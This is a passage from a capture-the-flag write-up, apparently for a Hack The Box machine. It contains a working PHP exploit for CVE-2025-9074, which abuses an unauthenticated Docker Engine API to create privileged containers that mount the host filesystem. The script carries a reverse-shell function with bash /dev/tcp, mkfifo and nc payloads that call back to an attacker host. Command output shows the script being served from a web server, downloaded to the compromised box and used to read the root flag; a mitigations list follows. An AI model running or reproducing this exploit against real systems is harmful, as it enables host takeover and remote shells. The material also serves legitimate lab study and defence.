    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, TIMEOUT);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json"]);
    curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
    
    if ($method === 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        if ($data !== null) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
        } else {
            curl_setopt($ch, CURLOPT_POSTFIELDS, '');
        }
    } elseif ($method === 'DELETE') {
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');
    } elseif ($method === 'GET') {
        curl_setopt($ch, CURLOPT_HTTPGET, true);
    }
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    if ($error) {
        throw new Exception("Curl error: $error");
    }
    
    if ($http_code >= 400) {
        $err = json_decode($response, true)['message'] ?? $response;
        throw new Exception("HTTP $http_code: $err");
    }
    
    if ($return_raw) {
        return $response;
    }
    
    return json_decode($response, true);
}

function cmd_exec($url, $cmd, $os = 'linux', $cleanup = false) {
    $url = rtrim($url, '/');
    $bind = get_bind_mount($os);
    
    echo "[*] Creating container...\n";
    $result = docker_api($url, 'POST', '/containers/create', [
        "Image" => "alpine:latest",
        "Cmd" => ["sh", "-c", $cmd],
        "Tty" => false,
        "HostConfig" => ["Privileged" => true, "Binds" => [$bind]]
    ]);
    
    $cid = substr($result['Id'], 0, 12);
    echo "[+] Container created: $cid\n";
    
    docker_api($url, 'POST', "/containers/{$cid}/start");
    echo "[+] Container started\n";
    
    // Wait for command to complete
    $waited = 0;
    $max_wait = 30;
    while ($waited < $max_wait) {
        $inspect = docker_api($url, 'GET', "/containers/{$cid}/json");
        if (!$inspect['State']['Running']) {
            break;
        }
        sleep(1);
        $waited++;
    }
    
    echo "[+] Output:\n";
    
    // Get logs with proper timeout
    $ch = curl_init("{$url}/containers/{$cid}/logs?stdout=1&stderr=1");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
    $logs_raw = curl_exec($ch);
    curl_close($ch);
    
    $output = demux_docker_logs($logs_raw);
    echo $output;
    
    if ($cleanup) {
        @docker_api($url, 'POST', "/containers/{$cid}/stop");
        @docker_api($url, 'DELETE', "/containers/{$cid}");
        echo "[+] Cleaned up\n";
    }
}

function reverse_shell($url, $lhost, $lport, $os = 'linux') {
    $url = rtrim($url, '/');
    $bind = get_bind_mount($os);
    
    echo "[*] Reverse shell → $lhost:$lport\n";
    echo "[!] Start listener: nc -lvnp $lport\n\n";
    
    $shell_cmd = "sh -c 'if command -v bash >/dev/null; then bash -i >& /dev/tcp/$lhost/$lport 0>&1; elif command -v nc >/dev/null; then rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc $lhost $lport > /tmp/f; else sh -i <&3 >&3 2>&3 & exec 3<>/dev/tcp/$lhost/$lport; cat <&3 | while read l; do \$l 2>&3 >&3; done; fi'";
    
    $result = docker_api($url, 'POST', '/containers/create', [
        "Image" => "alpine:latest",
        "Cmd" => ["sh", "-c", $shell_cmd],
        "HostConfig" => ["Privileged" => true, "Binds" => [$bind], "NetworkMode" => "host"]
    ]);
    $cid = substr($result['Id'], 0, 12);
    echo "[+] Container: $cid\n";
    
    docker_api($url, 'POST', "/containers/{$cid}/start");
    echo "[+] Reverse shell spawned! Check your listener.\n";
}

function show_help() {
    echo <<<'HELP'
Usage: php CVE-2025-9074.php -u <url> [options]

Modes:
  cmd      Execute single command (default)
  reverse  Reverse shell callback

Options:
  -u, --url <url>       Docker API URL (http://1.2.3.4:2375)
  -m, --mode <mode>     cmd|reverse (default: cmd)
  -c, --cmd <command>   Command to execute (required for cmd mode)
  -l, --lhost <ip>      Your IP for reverse shell (required for reverse mode)
  -p, --lport <port>    Your port (default 4444)
  --os <os>             linux|mac|windows (default: linux)
  --cleanup             Remove container after execution

Examples:
  php CVE-2025-9074.php -u http://192.168.65.7:2375 -m cmd -c "whoami"
  php CVE-2025-9074.php -u http://192.168.65.7:2375 -m cmd -c "cat /mnt/hostfs/flag.txt" --os windows --cleanup
  php CVE-2025-9074.php -u http://192.168.65.7:2375 -m reverse -l 10.10.14.36 -p 4444

HELP;
}

function main($argc, $argv) {
    print_banner();
    echo "\n";
    
    $opts = [
        'url' => null,
        'mode' => 'cmd',
        'cmd' => null,
        'lhost' => null,
        'lport' => 4444,
        'os' => 'linux',
        'cleanup' => false
    ];
    
    for ($i = 1; $i < $argc; $i++) {
        if ($argv[$i] === '-u' || $argv[$i] === '--url') {
            $opts['url'] = $argv[++$i] ?? null;
        } elseif ($argv[$i] === '-m' || $argv[$i] === '--mode') {
            $opts['mode'] = $argv[++$i] ?? 'cmd';
        } elseif ($argv[$i] === '-c' || $argv[$i] === '--cmd') {
            $opts['cmd'] = $argv[++$i] ?? null;
        } elseif ($argv[$i] === '-l' || $argv[$i] === '--lhost') {
            $opts['lhost'] = $argv[++$i] ?? null;
        } elseif ($argv[$i] === '-p' || $argv[$i] === '--lport') {
            $opts['lport'] = (int)($argv[++$i] ?? 4444);
        } elseif ($argv[$i] === '--os') {
            $opts['os'] = $argv[++$i] ?? 'linux';
        } elseif ($argv[$i] === '--cleanup') {
            $opts['cleanup'] = true;
        } elseif ($argv[$i] === '-h' || $argv[$i] === '--help') {
            show_help();
            return;
        }
    }
    
    if (!$opts['url']) {
        echo "[!] --url required\n";
        show_help();
        return;
    }
    
    try {
        $url = preg_match('/^https?:/', $opts['url']) ? $opts['url'] : "http://{$opts['url']}";
        
        echo "[*] Target: " . strtoupper($opts['os']) . " | " . get_bind_mount($opts['os']) . "\n\n";
        
        switch ($opts['mode']) {
            case 'reverse':
                if (!$opts['lhost']) {
                    echo "[!] --lhost required for reverse mode\n";
                    return;
                }
                reverse_shell($url, $opts['lhost'], $opts['lport'], $opts['os']);
                break;
            case 'cmd':
            default:
                if (!$opts['cmd']) {
                    echo "[!] --cmd required for cmd mode\n";
                    return;
                }
                cmd_exec($url, $opts['cmd'], $opts['os'], $opts['cleanup']);
                break;
        }
    } catch (Exception $e) {
        echo "[!] Error: " . $e->getMessage() . "\n";
    }
}

main($argc, $argv);
?>
```

**Explanation: PHP script Docker API**

Key components and API calls issued by above php script:

- `docker_api($url, $method, $endpoint, $data, $return_raw)`: wrapper that performs HTTP requests to the Docker Engine API using `curl`, sends/receives JSON, and optionally returns raw binary for logs.
- `GET /containers/json`: enumerates containers to find an existing `alpine` container to reuse.
- `POST /containers/create`: creates a container. The script supplies fields such as `Image`, `Cmd`, and `HostConfig`.
    - `HostConfig.Privileged = true` — grants extended capabilities inside the container.
    - `HostConfig.Binds` — mounts the host filesystem into the container (e.g. `/:/mnt/hostfs` or Windows mapping `/mnt/host/c:/mnt/hostfs`).
- `POST /containers/{id}/start`: starts the created container.
- `GET /containers/{id}/json`: inspects container state to determine when the command has finished.
- `GET /containers/{id}/logs?stdout=1&stderr=1`: retrieves combined stdout/stderr logs. The script demuxes Docker's 8-byte framed stream to extract plain output.
- `POST /containers/{id}/exec` + `POST /exec/{execId}/start`: used in interactive mode to create and attach an exec instance (interactive shell) inside a running container.
- `POST /containers/{id}/stop` and `DELETE /containers/{id}`: stop and remove the container when `--cleanup` is requested.

Host the script on a web server and upload to box


```shell
┌──(kali㉿kali)-[~/HTB/Windows/MonitorsFour]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.4.182 - - [24/May/2026 16:31:05] "GET /CVE-2025-9074.php HTTP/1.1" 200 -


www-data@821fbd6a43fa:/tmp$ curl http:///10.10.15.213/CVE-2025-9074.php -o CVE-2025-9074.php
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  8675  100  8675    0     0  16710      0 --:--:-- --:--:-- --:--:-- 16682
```

This script has two mode:

- cmd (for running a single command). Start an alpine container, execute the command in container as root and then remove the container if --cleanup flag is specified.

- reverse (establishing a reverse shell as root). Start an alpine container and execute a reverse shell as root user in the container.

```shell
www-data@821fbd6a43fa:/tmp$ php CVE-2025-9074.php 
╔═══════════════════════════════════════════════════════╗
║          CVE-2025-9074 - Docker Engine API RCE        ║
║      Unauthenticated Privileged Container Escape      ║
║               Docker Desktop < 4.44.3                 ║
╚═══════════════════════════════════════════════════════╝
[!] --url required
Usage: php CVE-2025-9074.php -u <url> [options]

Modes:
  cmd      Execute single command (default)
  reverse  Reverse shell callback

Options:
  -u, --url <url>       Docker API URL (http://1.2.3.4:2375)
  -m, --mode <mode>     cmd|reverse (default: cmd)
  -c, --cmd <command>   Command to execute (required for cmd mode)
  -l, --lhost <ip>      Your IP for reverse shell (required for reverse mode)
  -p, --lport <port>    Your port (default 4444)
  --os <os>             linux|mac|windows (default: linux)
  --cleanup             Remove container after execution

Examples:
  php CVE-2025-9074.php -u http://192.168.65.7:2375 -m cmd -c "whoami"
  php CVE-2025-9074.php -u http://192.168.65.7:2375 -m cmd -c "cat /mnt/hostfs/flag.txt" --os windows --cleanup
  php CVE-2025-9074.php -u http://192.168.65.7:2375 -m reverse -l 10.10.14.36 -p 4444
```

Since the script mount `C:\` to `/mnt/hostfs`, so root flag is located at `/mnt/hostfs/Users/Administrator/Desktop/root.txt`

```shell
www-data@821fbd6a43fa:/tmp$ php CVE-2025-9074.php --url http://192.168.65.7:2375 -m cmd --os windows -c "cat /mnt/hostfs/Users/Administrator/Desktop/root.txt" --cleanup
╔═══════════════════════════════════════════════════════╗
║          CVE-2025-9074 - Docker Engine API RCE        ║
║      Unauthenticated Privileged Container Escape      ║
║               Docker Desktop < 4.44.3                 ║
╚═══════════════════════════════════════════════════════╝
[*] Target: WINDOWS | /mnt/host/c:/mnt/hostfs

[*] Creating container...
[+] Container created: 550a6b47bfd8
[+] Container started
[+] Output:
**************67bdbf65071063db
[+] Cleaned up
```

### Privilege Escalation Summary

**Attack Chain:**

- Discovery: From a compromised container we discovered the Docker Engine API reachable on the internal Docker Desktop address (e.g. `192.168.65.7:2375`).
- Exploitation: Used the PHP script to call unauthenticated Engine API endpoints to `POST /containers/create` with `HostConfig.Privileged=true` and `HostConfig.Binds` mounting the host filesystem.
- Execution: Started the container (`POST /containers/{id}/start`) and ran commands in it (via `Cmd` at creation or `exec`), then read outputs via `GET /containers/{id}/logs` and `GET /containers/{id}/json`.
- Escalation: With the host filesystem mounted and privileged capabilities, the attacker could read sensitive host files (e.g. Windows `C:\Users\Administrator\Desktop\root.txt`) and perform actions leading to host compromise.
- Post-Exploitation: Typical follow-ups include extracting credentials, creating persistence, and lateral movement on the host.

**Key Vulnerability:**

An unauthenticated, network-reachable Docker Engine API allowed attacker-controlled containers to be created with host mounts and privileged mode. That API-level control is the root cause enabling privilege escalation to the host.

**Mitigations:**

- Disable exposing the Docker daemon over unauthenticated TCP; require TLS and authentication.
- Update Docker Desktop to a patched version that fixes CVE-2025-9074.
- Restrict container networks and avoid placing untrusted workloads on networks that can reach the daemon.
- Monitor and alert on creation of privileged containers and host bind mounts.


